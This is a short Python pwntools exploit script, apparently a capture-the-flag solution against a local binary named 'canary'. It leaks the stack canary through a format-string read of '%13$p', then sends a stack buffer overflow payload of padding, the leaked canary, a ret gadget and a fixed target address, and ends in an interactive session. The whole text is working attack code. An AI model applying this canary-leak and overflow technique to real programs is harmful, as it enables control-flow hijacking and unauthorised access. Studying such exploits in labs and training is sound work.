from pwn import*
p= process('./canary')
# p=remote("127.0.0.1", 30818)
p.sendline(b'%13$p')
p.recvuntil(b'chirps:\n')
canary = int(p.recvline().strip(), 16)   # 直接 int 转换，自动识别 0x 前缀
log.success(f'canary: {hex(canary)}')
p1=b'a'*56
p2=b'b'*8
bin=0x0004011FE
ret=0x00040101A
pad=p1+p64(canary)+p64(0)+p64(ret)+p64(bin)
p.send(pad)
p.interactive()